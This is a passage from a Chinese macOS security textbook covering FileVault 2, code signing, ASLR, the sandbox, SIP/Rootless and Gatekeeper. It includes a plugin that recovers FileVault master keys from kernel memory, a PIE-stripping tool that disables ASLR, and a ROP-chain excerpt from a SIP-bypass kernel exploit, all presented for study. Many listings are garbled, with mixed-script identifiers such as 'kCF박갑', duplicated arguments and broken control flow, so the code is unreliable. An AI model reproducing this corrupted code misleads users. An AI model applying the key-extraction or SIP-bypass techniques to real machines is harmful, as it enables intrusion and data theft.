CFStringRef url = CFSTR("https://www.xxx.com");
CFURLRef myURL = CFURLCreateWithString(kCFзалatorDefault, url, NULL);
CFStringRef requestMethod = CFSTR("GET");
CFHTTPMessageRef myRequest = CFHTTPMessageCreateRequest(kCF박갑(kCF박갑, requestMethod, myURL, kCFHTTPVersion1_1);
CFDataRef bodyDataExt = CFStringCreateExternalRepresentation(kCF박갑(kCF박갑, bodyData, kCF박갑(kCF박갑, bodyData, kCFStringEncodingUTF8, 0));
CFHTTPMessageSetBody(myRequest, bodyDataExt);
CFHTTPMessageSetHeaderFieldValue(myRequest, headerFieldName, headerFieldValue);
CFDataRef mySerializedRequest = CFHTTPMessageCopySerializedMessage(myRequest);

### 2.5 系统安全机制

说起系统安全, 大家最耳熟能详的应该是 iOS 设备的越狱了! 苹果系统并非一个开放的系统, 它的安全很大程度上来源于技术的不公开性。大多数的安全研究人员通过审阅苹果公司少许开源组件的源代码, 通过逆向系统二进制程序与 Fuzz 技术来寻找系统的漏洞。为了加强系统的安全性, 苹果系统每一次升级都会带来许多新的安全特性, 本节将探讨目前 macOS 系统上使用到的安全技术。

### 2.5.1 FileVault 2

FileVault是macOS系统中使用的一种磁盘加密技术。在10.7系统以后，FileVault技术有所改进，版本升级为2，即FileVault 2。新版本的FileVault通过AES对称加密算法使用128位的密钥对整个磁盘进行加密。加密后的文件以加密形式存在磁盘中，只有当系统授权的用户登录成功并访问文件时，文件才会从磁盘解密。

未开启磁盘加密的电脑，可以手动地开启它。点击 System Preferences（系统偏好设置）→Security & Privacy（安全性与隐私）进行管理。点击 Security & Privacy 界面上的“FileVault”标签，点击左下角的小锁，输入登录用户名与密码，解锁设置修改后，就可以开启或关闭 FileVault 了，如图 2-5 所示。

 </div>

对于MacBook Pro 512G大小的磁盘，开启FileVault可能需要3个小时左右。在开启过程中，系统会提示你是否将恢复密钥保存到苹果的服务器上，以便以后本地丢失或忘记FileVault密钥时能恢复磁盘。在开启FileVault成功后，由于每次文件的读写都有一个加密与解密的过程，系统的性能或多或少都会有所影响。

关于对FileVault 2加密技术的攻击，国内外的安全人员一直都在研究，目前已知的有3种攻击方法：旁路攻击、内存攻击和物理攻击。下面我们分别进行介绍。

# 1. 旁路攻击

这种攻击方式针对的主体不是磁盘解密，而是操作系统。由于FileVault 2的高安全特性，在不正确的场景中使用它，将可能导致非常尴尬的局面发生。Google提供的概念恶意木马程序macdestroyer $ ^{①} $就很好地诠释了这一点。

系统开启FileVault 2后，会在系统登录时提示用户需要提供登录的管理员账户与密码。如果登录的用户不是管理员，或者管理员密码错误，都会导致系统无法登录，且磁盘中的数据无法访问，即使将磁盘拆解下来放到其他电脑上查看也没用。macdestroyer程序会在运行后向系统中添加一个名为fde_locked_user的用户，并生成一个长度为32位的随机密码，然后将该用户添加到具有解锁磁盘权限的用户组，接下来删除掉系统中所有其他的用户，只保留新添加的用户，最后关闭计算机。这一招实在是太狠了！程序这样操作后的结果就是：下次启动电脑后，用户就再也无法进入系统了，磁盘上的数据再也无法访问了！如果这种技术被加入到一个具有0day系统提权能力的木马程序中，将是件非常可怕的事情！

# 2. 内存攻击

启用FileVault 2加密技术的系统，会将磁盘解密用到的MasterKey（主密钥）存放于系统内核的一块只读区域中，研究人员使用安全测试框架对虚拟机中安装的macOS系统进行分析发现，内核空间中的加密密钥始终存于特定的内存区域，可以在内存中直接搜索找到密钥，代码片段如下：

class mac_filevault2(pstasks.mac_tasks):
    "" Attempts to recover FileVault 2 Volume Master Keys ""

def calculate(self):
    common.set_plugin_members(self)
    procs = pstasks.mac_tasks.calculate(self)

    for proc in procs:
        if str(proc.p_comm) != "kernel_task":
            continue

        proc_as = proc.get_process_address_space()
        for map in proc.get_proc_maps():
            if not map.get_perm( ) == 'r--':
                continue

            address = map.links.start
            Vmk1 = proc_as.read(address, 16)
            Vmk2 = proc_as.read(address + 0x430, 16)  #Note: Vmk2 refers to our second instance of the VMK, not the tweak key.

            signature = obj.Object("unsigned int", offset = address, vm = proc_as)

            if not Vmk1 or signature == 0x0:

if Vmk1 == Vmk2:
    yield address, Vmk1

def unified_output(self, data):
    return TreeGrid([("Address", Address),
                          ("Volume Master Key", str)
                          ], self.generator(data))

def generator(self, data):
    for (address, Vmk1) in data:
        vmk = []
        for o, h, c inutils.Hexdump(Cmp1):
            vmk.append(h)
        yield(0, [Address(address), str(''.join(vmk).replace("", "",)],])

def render_text(self, outfd, data):
    self.table_header(outfd, [( "Address", "#018x"),
                          ("Volume Master Key", "32")])
    for (address, Vmk1) in data:
        vmk = []
        for o, h, c inutils.Hexdump(Vmk1):
            vmk.append(h)

        self.table_row(outfd,
                          address,
                          ''.join(vmk).replace(" ", "",))

目前10.9~10.12的系统都将受影响，但所幸这种攻击方式针对的目标系统是虚拟机，真实的电脑系统攻击起来要麻烦得多。

# 3. 物理攻击

这种攻击称为DMA（Direct Memory Access）攻击，前提是攻击人员能物理接触硬件设备。瑞典硬件黑客Ulf Frisk制造了一台设备，能在电脑启动时读取硬盘并开启FileVault 2加密的主密码，整个过程不到30秒，攻击使用到的定制化硬件配合开源的攻击软件。当然，苹果也意识到了这种攻击对系统安全带来的威胁，在最新的系统更新中修补了漏洞。DMA除了可攻击macOS系统外，还可应用于Windows与Linux等系统的硬件加密，有兴趣的读者可以参看Ulf Frisk的开源项目pcileech（https://github.com/ufrisk/pcileech），了解更多攻击原理与细节。

#### 2.5.2 代码签名

代码签名是一种对软件完整性检查、软件作者身份识别的技术，它是macOS系统上大多数安全特性得以有效实施的基础。代码签名技术是从macOS 10.5开始引入的，这是第一代iPhone手机发布的时间，代码签名可以理解为苹果公司出于对移动设备安全性的考虑而引入的技术。

代码签名使用现代密码学技术，依赖于X.509标准的公开密钥加密算法，对软件的代码进行

数字签名。macOS平台的软件开发者向苹果应用商店提交的应用软件都必须事先经过代码签名。代码签名需要用到向苹果公司申请开发者资格时申请到的证书。证书中包含了私钥、公钥、颁发者以及开发人员的一些信息。这些信息使用KeyChain存储在macOS系统中。可以通过打开KeyChain Access来查看本机的开发者证书信息。在login下面的Category中选择My Certificates项，会列出所有的用户证书，双击任意一项就可以查看详情。另外也可以执行如下命令查看：

$ security find-identity -v -p codesigning
1) C2044303FAB483CF260480C7D96AF428A46E84CA "Mac Developer: 346345565@qq.com (FZGS93936A)"

签名的过程使用命令行工具codesign完成。除了对二进制应用进行签名外，codesign还可以对动态库、脚本以及macOS软件包中的所有资源进行签名。使用Xcode编译一个应用时，在应用构建完成后会自动调用codesign进行签名，也可以使用如下命令对应用进行手动签名：

$ codesign -s '346345565@qq.com (FZGS93936A)' xxx.app

如果使用adhoc签名，只需要指定-s参数为“-”:

$ codesign -s '-' xxx.app

如果对一个签名过的应用重新签名，需要加上-f参数：

$ codesign -f -s '346345565@qq.com (FZGS93936A)' xxx.app

使用codesign也可以查看应用的签名信息。可以使用如下命令查看二进制程序的签名：

$ codesign -d -vv /usr/bin/python

Executable=/usr/bin/python

Identifier=com.apple.python

Format=Mach-0 universal (i386 x86_64)

CodeDirectory v=20100 size=225 flags=0x0(none) hashes=6+2 location=embedded

Platform identifier=1

Signature size=4105

Authority=Software Signing

Authority=Apple Code Signing Certification Authority

Authority=Apple Root CA

Info.plist=not bound

TeamIdentifier=not set

Sealed Resources=none

Internal requirements count=1 size=64

##### 使用如下命令查看软件包的签名：

$ codesign -d -vv /Applications/App\ Store.app
Executable=/Applications/App Store.app/Contents/MacOS/App Store
Identifier=com.apple.appstore
Format=bundle with Mach-0 thin (x86_64)
CodeDirectory v=20100 size=307 flags=0x0(none) hashes=7+5 location=embedded
Platform identifier=1
Signature size=4105
Authority=Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
Info.plist entries=30
TeamIdentifier=not set

Sealed Resources version=2 rules=13 files=350

Internal requirements count=1 size=68

在输出的信息中，Executable为签名对象的可执行程序的路径，codesign在进行签名的过程中，会改写该可执行文件，在文件的load commands中，添加一个LC_CODE_SIGNATURE项，里面会写入代码签名的一些信息。Identifier为程序的标识符，苹果系统上开发的软件都有独一无二的标识符，它的命名规则与Java语言中的包名一样，使用反写的域名方式来表示。Format对于不同类型的签名对象输出不同，如对于命令行的python，输出为Mach-O universal (i386 x86_64)，表示这是一个通用二进制可执行程序，支持在多个架构的CPU上运行；对于App Store.app，输出是bundle with Mach-O thin (x86_64)，表示这是一个64位的Bundle软件包。CodeDirectory是嵌入二进制的一段签名信息，后面的Authority表示证书的签发机构为Apple Root CA。在苹果系统上，对代码进行签名验证的最终机构都是苹果公司的Root CA。

程序包签名与单独的二进制程序签名不同，程序包除了包含可执行文件外，还包含了程序运行时用到的各种资源、图片和不同的语言文件。为一个程序包添加签名时，包中的所有资源文件也会被同时签名。签名的过程中会在程序包中新建一个叫作“CodeSignature/CodeResources”的文件，该文件中存储了被签名程序包中所有文件的签名Hash信息。CodeResources本质上是一个plist文件，可以使用任意一个文件编辑器打开查看。

关于代码签名的过程细节，会在讲解Mach-O文件格式时具体讨论。

#### 2.5.3 ASLR / KASLR

ASLR（Address space layout randomization）意为地址空间布局随机化，针对内核则是KASLR（Kernel address space layout randomization），这是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。它并非是macOS系统上特有的安全技术，在主流的Linux、Windows等操作系统中都有使用。

macOS从10.7开始引入了ASLR / kASLR技术。在开启了ASLR / kASLR的macOS系统上，每次系统启动后，内核模块与程序库都会加载到不同的地址上，这样系统API地址每次都会不同。首先看一下本节演示程序getbaseaddr的代码：

#include <stdio.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/sysctl.h>

#include <mach/mach.h>
#include <mach/mach_init.h>
#include <mach/mach_vm.h>
#include "libkern/OSCacheControl.h"

mach_vm_address_t get_basic_address(){
    mach_vm_size_t region_size = 0;
    mach_vm_address_t region = 0;
    mach_port_t task = 0;
    int ret = 0;

    ret = task_for_pid(mach_task_self(), getpid(), &task);
    if (ret != 0)
    {
        printf("task_for_pid() message %s!\n", mach_error_string(ret));
        return 0;
    }

    vm_region_basic_info_data_64_t info;
    mach_msg_type_number_t info_count = VM_REGION_BASIC_INFO_COUNT_64;
    vm_region_flavor_t flavor = VM_REGION_BASIC_INFO_64;
    if ((ret = mach_vm_region(mach_task_self(), &region, &region_size, flavor, (vm_region_info_t)&info, (mach_msg_type_number_t*)&info_count, (mach_port_t*)&task)) != KERN_SUCCESS)
    {
        printf("mach_vm_region() error: %s!\n", mach_error_string(ret));
        return 0;
    }
    return region;
}

int main(int argc, const char * argv[])
{
    mach_vm_address_t address = get_basic_address();

    printf("Target pid : %d\n", getpid());
    printf("Base address : %llx\n", address);

    return 0;
}

编译执行程序，输出如下：

$ ./getbaseaddr
Target pid : 716
Base address : 105957000

注意，程序使用了task_for_pid()接口，从10.11系统起，该API默认被禁用，启用的方法是手动关闭系统的Rootless，具体方法参见2.5.5节。

getbaseaddr程序通过task_for_pid()获得当前进程的task信息，然后调用mach_vm_region()获取当前任务的region信息，即程序的内存加载地址。getbaseaddr程序每次启动输入的地址信息都不同，这就是默认开启ASLR后的效果。这样可以有效地防御溢出攻击中使用固定值代替系统API地址的情况发生。

开启了ASLR的程序，在将代码加载到内存中时，每次会选择不同的基地址。ASLR依赖PIE（位置无关程序），程序关闭了PIE也就是关闭了ASLR。对于开发人员构建的程序，Xcode提供了

编译选项来关闭程序的ASLR。在Build Settings的Linking一栏，将“Generate Position-Dependent Executable”的值设置为Yes即可，如图2-6所示。

Y Linking

Setting
Bundle Loader
Compatibility Version
Current Library Version
Dead Code Stripping
Display Mangled Names
Don't Dead-Strip Inits and Terms
Dynamic Library Install Name
Dynamic Library Install Name Base
Exported Symbols File

Initialization Routine

 </div>

开启了ASLR的程序，会在程序的二进制Mach-O头部信息中包含一个PIE标志，执行以下命令查看：

otool -hV /Applications/App\ Store.app/Contents/MacOS/App\ Store
/Applications/App Store.app/Contents/MacOS/App Store:
Mach header
magic cputype cpusubtype caps filetype ncmds sizeofcmds flags
MH_MAGIC_64 X86_64 ALL LIB64 EXECUTE 26 3664 NOUNDEFS DYLDLINK TWOLEVEL PIE

在flags一栏，会有flags标志。对于关闭PIE的程序，则输出如下：

$ otool -hV ~/aslr_test
/Users/macbook/aslr_test:
Mach header
magic cputype cpusubtype caps filetype ncmds sizeofcmds flags
MH_MAGIC_64 X86_64 ALL LIB64 EXECUTE 16 1296 NOUNDEFS DYLDLINK TWOLEVEL

对于编译好并且已经开启了PIE的程序，可以通过手动修改它头部的flags值来去掉PIE属性，从而达到关闭ASLR的目的。网上已经有完成类似工作的开源程序`disable_aslr`可供参考。当然，自己实现一个这样的工具也不难，代码如下：

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <στάint.h>
#include <mach-o/loader.h>
int main(int argc, char *argv[]) {
    struct mach_header currentHeader;
    FILE *fp;
    if (argc < 1)
        return 0;
}

printf("Please enter the filename binary: in the format removePIE filename.\n");
return EXIT_FAILURE;
}

if((fp = fopen(argv[1], "rb+")) == NULL)
{
    printf("Error, unable to open file.\n");
    return EXIT_FAILURE;
}

if (0 == fread(&currentHeader, sizeof(currentHeader), 1, fp))
{
    printf("Error reading MACH-O header.\n");
    return EXIT_FAILURE;
}

if(currentHeader.magic == MH_MAGIC || currentHeader.magic == MH_MAGIC_64){
    printf("patch MH_MAGIC/MH_MAGIC_64.\n");
    currentHeader.flags &= ~MH_PIE;

    fseek(fp, 0, SEEK_SET);
    if((fwrite(&currentHeader, sizeof(currentHeader), 1, fp)) != sizeof(currentHeader))
    {
        printf("Error writing to file.\n");
    }
    printf("ASLR has been disabled for %s\n", argv[1]);
    fclose(fp);

    return EXIT_SUCCESS;
}

else if(currentHeader.magic == MH_CIGAM || currentHeader.magic == MH_CIGAM_64) // big endian
{
    printf("patch MH_CIGAM/MH_CIGAM_64.\n");
    uint32_t flags = OSSwapInt32(currentHeader.flags);
    flags &= ~MH_PIE;
    currentHeader.flags = OSSwapInt32(flags);

    fseek(fp, 0, SEEK_SET);
    if((fwrite(&currentHeader, sizeof(currentHeader), 1, fp)) != sizeof(currentHeader))
    {
        printf("Error writing to file.\n");
    }
    printf("ASLR has been disabled for %s\n", argv[1]);
    fclose(fp);

    return EXIT_SUCCESS;
}

else //FAT_MAGIC/FAT_CIGAM, 此处没有实现, 读者可以自行加上
{
    printf("not supported.\n");
    return EXIT_FAILURE;
}

return EXIT_FAILURE;

}

关闭ASLR后的getbaseaddr程序，本机上运行输出信息如下：

$./getbaseaddr
Target pid : 51000
Base address : 100000000

每次程序运行时，进程pid都在变化，但加载地址始终是默认的首选地址0x100000000。

在很多情况下，绕过系统的ASLR是编写溢出程序的关键一步，安全研究人员也会时常关注苹果系统的各种安全机制，探索绕过ASLR的方法，如之前爆出的CVE-2015-7046漏洞，就是因为沙盒机制中没有正确地实现权限隔离，导致攻击者可以在root权限下运行一个经过构造的App来绕过ASLR保护机制。

#### 2.5.4 沙盒

对于不同的系统和软件应用场景，沙盒（sandbox）技术的含义也不同。在Windows系统上，有著名的沙盒软件Sandboxie用于虚拟软件运行环境；在安卓系统中，有DroidBox沙盒环境用于恶意软件分析；在安装了Java运行环境的电脑上，也有一个Java安全管理器负责检查运行在系统上的Java代码是否有权访问系统资源。

macOS系统上的沙盒通过为软件提供受限的资源访问权限来对软件进行控制，发布到苹果应用商店的程序必须开启沙盒。沙盒的开启与使用可以在Xcode中进行配置。在项目的Capabilities中，将App Sandbox开启，会看到沙盒的受限环境中，对4种资源进行了访问控制，如图2-7所示。

 </div>

 </div>

权限如下。

□ Network：控制服务器发来的网络连接与客户端发出的网络连接。

Hardware：硬件资源控制。包括摄像头、麦克风、USB外设与打印机的访问。

□ App Data：程序数据控制。包括联系人、位置与日历信息。

File Access: 文件访问控制。包括用户所选的文件、Downloads文件夹、Pictures文件夹、Music文件夹、Movies文件夹的读写。

应用程序可以根据自己的需求适当地勾选其中的选项，这些选项会保存到项目命名的entitlements文件中，可以使用任何plist编辑器打开，例如可以使用PlistEdit Pro $ ^{①} $，如图2-8所示。

 </div>

系统Sandbox通过读取程序的entitlements来检查程序可以访问的系统资源，entitlements在程序签名的过程中，写入到了程序的签名信息中，可以使用codesign读取已签名程序中的entitlements。执行如下命令，输出的内容与图2-8中的内容一致。

$ codesign -d --entitlements - guitest.app

在软件中开启沙盒后，程序是不能随意访问外部资源的。例如，下面这段访问文件的代码是

会直接返回失败的。

open("/Users/xxx/Library/123.bin");

沙盒提供了一个称为Container（容器）的环境，开发人员只能读写容器内的文件。Container实际上是一个目录，位于~/Library/Containers/，每个开启了沙盒的软件都会在此目录下生成一个以程序标识符命名的子目录，此目录下会将一些系统特定的目录以软链接的形式创建在此目录中的Data目录下。当访问一些特定的目录时，实际上是通过软链接的形式来访问系统的真实目录。一个典型沙盒环境下的程序目录如图2-9所示。

Name
Container.plist
Data
Desktop
Documents
Downloads
Library
Movies
Music
Pictures

 </div>

以上代码的正确做法应该是，先通过NSHomeDirectory()获取程序沙盒环境下的用户目录，然后读取其下的Library目录中的文件。假如程序的标识符为“com.macbook.sandbox”，那么，文件最终重定向访问为“~/Library/Containers/com.macbook.sandbox/Data/Library/123.bin”。

#### 2.5.5 Rootless

macOS 10.11引入了一个新的安全特性：Rootless（更少的Root权限），又称为SIP（System Integrity Protection，系统完整性保护）。通过Rootless，系统可以决定即使第三方程序获取了系统Root权限，也不能做以下事情。

文件系统保护。新版本系统中重要的目录与文件，不能被第三方应用程序任意修改。例如/System、/bin、/sbin、/usr等目录中的文件，第三方程序即使获取了Root权限也不可修改。执行以下命令可以查看系统中被保护的目录：带有restricted标志的项都是受到Rootless保护的。系统中所有被保护的系统目录及程序列表可以查看/System/Library/Sandbox/rootless.conf文件。另外，文件系统保护还维护了一个例外名单：/System/Library/Sandbox/Compatibility.bundle/Contents/Resources/paths，此名单会在后台静默升级。

$ ls -l0 /
total 52
drwxrwxr-x+ 159 root admin sunlnk 5406 Mar 7 13:15 Applications
drwxr-xr-x+ 63 root wheel sunlnk 2142 Oct 22 15:19 Library
drwxr-xr-x@ 2 root wheel hidden 68 Oct 9 11:41 Network
drwxr-xr-x@ 4 root wheel restricted 136 Jan 23 11:35 System
drwxr-xr-x 7 root admin - 238 Jan 5 11:10 Users

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>drwxrwxrwt@</td><td style='text-align: center; word-wrap: break-word;'>6 root</td><td style='text-align: center; word-wrap: break-word;'>admin</td><td style='text-align: center; word-wrap: break-word;'>hidden</td><td style='text-align: center; word-wrap: break-word;'>204 Mar</td><td style='text-align: center; word-wrap: break-word;'>9 13:07 Volumes</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drwxr-xr-x@</td><td style='text-align: center; word-wrap: break-word;'>39 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>restricted, hidden</td><td style='text-align: center; word-wrap: break-word;'>1326 Jan 23</td><td style='text-align: center; word-wrap: break-word;'>11:34 bin</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drwxrwxr-t@</td><td style='text-align: center; word-wrap: break-word;'>2 root</td><td style='text-align: center; word-wrap: break-word;'>admin</td><td style='text-align: center; word-wrap: break-word;'>hidden</td><td style='text-align: center; word-wrap: break-word;'>68 Oct</td><td style='text-align: center; word-wrap: break-word;'>9 11:41 cores</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dr-xr-xr-x</td><td style='text-align: center; word-wrap: break-word;'>3 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>hidden</td><td style='text-align: center; word-wrap: break-word;'>7809 Mar</td><td style='text-align: center; word-wrap: break-word;'>4 13:04 dev</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>lrwxr-xr-x@</td><td style='text-align: center; word-wrap: break-word;'>1 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>restricted, hidden</td><td style='text-align: center; word-wrap: break-word;'>11 Oct</td><td style='text-align: center; word-wrap: break-word;'>9 11:40 etc -&gt; private/etc</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dr-xr-xr-x</td><td style='text-align: center; word-wrap: break-word;'>2 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>hidden</td><td style='text-align: center; word-wrap: break-word;'>1 Mar</td><td style='text-align: center; word-wrap: break-word;'>4 13:05 home</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-rw-r--r--@</td><td style='text-align: center; word-wrap: break-word;'>1 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>hidden</td><td style='text-align: center; word-wrap: break-word;'>313 Aug 23</td><td style='text-align: center; word-wrap: break-word;'>2015 installer.failurerequests</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dr-xr-xr-x</td><td style='text-align: center; word-wrap: break-word;'>2 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>hidden</td><td style='text-align: center; word-wrap: break-word;'>1 Mar</td><td style='text-align: center; word-wrap: break-word;'>4 13:05 net</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drwxrwxr-x@</td><td style='text-align: center; word-wrap: break-word;'>5 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>hidden</td><td style='text-align: center; word-wrap: break-word;'>170 May 31</td><td style='text-align: center; word-wrap: break-word;'>2015 opt</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drwxr-xr-x@</td><td style='text-align: center; word-wrap: break-word;'>6 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>hidden</td><td style='text-align: center; word-wrap: break-word;'>204 Oct</td><td style='text-align: center; word-wrap: break-word;'>9 11:41 private</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drwxr-xr-x@</td><td style='text-align: center; word-wrap: break-word;'>59 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>restricted, hidden</td><td style='text-align: center; word-wrap: break-word;'>2006 Jan 23</td><td style='text-align: center; word-wrap: break-word;'>11:34 sbin</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>lrwxr-xr-x@</td><td style='text-align: center; word-wrap: break-word;'>1 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>restricted, hidden</td><td style='text-align: center; word-wrap: break-word;'>11 Oct</td><td style='text-align: center; word-wrap: break-word;'>9 11:40 tmp -&gt; private/tmp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>drwxr-xr-x@</td><td style='text-align: center; word-wrap: break-word;'>12 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>restricted, hidden</td><td style='text-align: center; word-wrap: break-word;'>408 Feb 24</td><td style='text-align: center; word-wrap: break-word;'>13:04 usr</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>lrwxr-xr-x@</td><td style='text-align: center; word-wrap: break-word;'>1 root</td><td style='text-align: center; word-wrap: break-word;'>wheel</td><td style='text-align: center; word-wrap: break-word;'>restricted, hidden</td><td style='text-align: center; word-wrap: break-word;'>11 Oct</td><td style='text-align: center; word-wrap: break-word;'>9 11:40 var -&gt; private/var</td></tr></table>

□ 运行时保护。向一个系统进程中注入代码与修改磁盘上受保护的文件一样，都是会失败的。受系统保护的程序与使用苹果私有的entitlements签名的程序，在运行时都被内核标记为restricted（受限的）。在新系统中，开发人员再也不能直接使用task_for_pid()、processor_set_tasks()来对受保护的进程进行操作了，它会直接返回EPERM错误，这将影响低版本系统中很多工具的正常运行，如本书后面要讲到的DTrace工具。同样受到限制的还有dyld。dyld是苹果系统中的可执行程序加载器，它允许外部定义一些环境变量来控制dyld的行为，经典的有使用DYLD_INSERT_LIBRARIES来注入动态库。例如对系统中的Finder进行动态调试就会返回如下错误：

$ sudo lldb -n Finder
Password:
(lldb) process attach --name "Finder"
error: attach failed: cannot attach to process due to System Integrity Protection
(lldb)

内核扩展限制。第三方开发的kext内核扩展必须经过签名之后放到/Library/Extensions目录下。之前可以设置kext-dev-mode=1来加载第三方驱动程序，现在被禁止了，执行如下命令会被系统忽略：

sudo nvram boot-args='kext-dev-mode=1'

系统在开启了Rootless后，安全研究人员在分析程序时会遇到诸多阻碍，macOS系统提供了手动关闭Rootless的方法，不过操作起来有点麻烦，需要到系统恢复模式中操作：开机按住command + R，进入恢复模式，打开Terminal终端，输入csrutil disable，回车后重启系统，Rootless就关闭了，可以执行以下命令查看效果：

csrutil status
System Integrity Protection status: disabled.

要重新开启Rootless，只需要将disable改为enable，执行csrutil enable即可。

csrutil工具可以开启与关闭Rootless，可以尝试逆向该命令行工具来探索它的工具原理。打开反汇编工具Hopper，将/usr/bin/csrutil文件拖到Hopper主界面，点击OK后等待自动化分析完成。等分析完成后定位关键点，最后找到：

int sub_100002004(int arg0) {
    var_1C = arg0;
    r14 = IORegistryEntryFromPath(*(int32_t *)_kIOMasterPortDefault, "IODeviceTree:/options");
    rbx = 0x5;
    if (r14 != 0x0) {
        r15 = CFDataCreateWithBytesNoCopy(*_kCFзалогов(var_1C, 0x4, *_kCFзалогов(var_1C, @"csr-active-config", r15);
        rbx = IORegistryEntrySetCFProperty(r14, @"csr-active-config", r15);
        CFRelease(r15);
        IOObjectRelease(r14);
    }
    rax = rbx;
    return rax;
}

关闭Rootless时传入的参数是0x77，开启时传入的是0x10，此值最终设置为csr-active-config在IODeviceTree:/ options里的值。csr-active-config的取值可以通过xnu内核源代码的BSD/sys/csr.h文件查看：

/* Rootless configuration flags */
#define CSR_ALLOW_UNTRUSTED_KEXTS (1 << 0)
#define CSR_ALLOW_UNRESTRICTED_FS (1 << 1)
#define CSR_ALLOW_TASK_FOR_PID (1 << 2)
#define CSR_ALLOW_KERNEL_DEBUGGER (1 << 3)
#define CSR_ALLOW_APPLE_INTERNAL (1 << 4)
#define CSR_ALLOW_UNRESTRICTED_DTRACE (1 << 5)
#define CSR_ALLOW_UNRESTRICTED_NVRAM (1 << 6)
#define CSR_ALLOW_DEVICE_CONFIGURATION (1 << 7)
0x77（二进制1110111）开启了0、1、2、4、5

苹果系统版本在macOS 10.11.1的时候，内核的一个提权漏洞导致了Rootless可以被绕过，网上也有人放出了Rootless bypass工具stfusip $ ^{①} $。它的部分代码片段如下所示：

alloc_null(0x1000);
volatile uint64_t *trigger=(uint64_t*)0x18, *pivot=(uint64_t*)0x261;
uint64_t fake_stack[16];
bzero(fake_stack, 16);

fake_stack[0] = RNR_POP_RDI(map);
fake_stack[1] = status;
fake_stack[2] = RNR_SLIDE_POINTER(nr_locate_symbol_in_map(map, "__csr_set_allow_all"));
fake_stack[3] = RNR_SLIDE_POINTER(nr_locate_symbol_in_map(map, "__thread_exception_return"));
printf("[+] built ROP chain @ %p (mapped @ %p)!\n", fake_stack, pivot);

*trigger = RNR_XCHG_ESP_EAX(map); //execute pivot
printf("[+] trigger set: %p : %#llx\n", trigger, (uint64_t)*trigger);

pivot[0] = RNR_POP_RSP(map);
pivot[1] = (uint64_t)fake_stack;
mach_voucher_attr_command(kv, 610, 0, 0, 0, 0);
.....

攻击程序通过alloc_null()触发空指针内核提权漏洞后会覆盖堆栈，调用_csr_set_allow_all()函数来关闭Rootless。此函数的源代码位于内核源代码的BSD/kern/kern_csr.c文件中，代码如下：

void
csr_set_allow_all(int value)
{
    csr_allow_all = !value; // force value to 0 or 1
}
设置了csr_allow_all的值为1，系统就关闭了Root

除了使用Root提权漏洞调用_csr_set_allow_all()关闭Rootless外，还可以使用加载内核模块的方式，在内核中控制csr_set_allow_all()，这种方式典型的有rootfool $ ^{®} $，不过在macOS 10.11.4之后，系统内核移除了csr_set_allow_all()接口来开启关闭Rootless。这意味着除了通过恢复模式这种方式外，目前想要手动关闭Rootless，就需要另寻它法了。网上就有人研究，通过修改系统更新镜像文件，向其中添加一个启动项，启动的脚本执行/usr/bin/csrutil disable，从而关闭Rootless $ ^{®} $。总之，安全人员从未放弃寻找绕过Rootless的方法。

#### 2.5.6 Gatekeeper

Gatekeeper直译为“看门人”，在macOS系统中，这扇门指的是当前计算机系统。它是macOS 10.7.5中引入的安全特性，作用就是检测从互联网上下载或从其他地方安装的软件，当它们在系统中首次运行时，确保它们的行为对系统没有危害。

在升级与安装macOS 10.7以后，系统在默认情况下只允许用户安装来自苹果应用商店的软件。如果需要安装从网上下载或者从其他地方复制的软件，系统会弹出提示框并阻止软件运行，如图2-10所示。

 </div>

要想运行来自互联网上下载的软件，需要修改系统默认配置。可以点击Dock上的System Preferences图标，打开系统设置界面，点击Security & Privacy，选择General选项，点击界面左下角的锁头并输入用户密码解锁，在Allow apps downloaded from一项选择Mac App Store and identified developers或Anywhere选项。前者允许苹果商店与经过苹果授权的Developer ID签名过的程序运行，后者则关闭了验证，允许任何软件运行。

关于Gatekeeper，有以下两个问题值得思考。

(1) 系统如何判断软件是从网上下载的还是从苹果商店下载的？

(2) 系统如何检测并判断从网上下载的程序是否会对系统造成威胁?

使用浏览器在网上下载的程序都会被打上“标签”，这些“标签”作为macOS的HFS+文件系统的扩展属性存储在用户的电脑上，用户在终端执行ls -al列举文件时，会发现带有“标签”的文件多出一个“@”标志，可以使用系统自带的xattr -1命令查看“标签”的信息。“标签”中可能包含了文件下载的日期与网址，如果不对“标签”进行处理，这些信息即使是在软件复制、打包或制作镜像时也不会被删除，可以使用xattr -d命令删除标签信息。

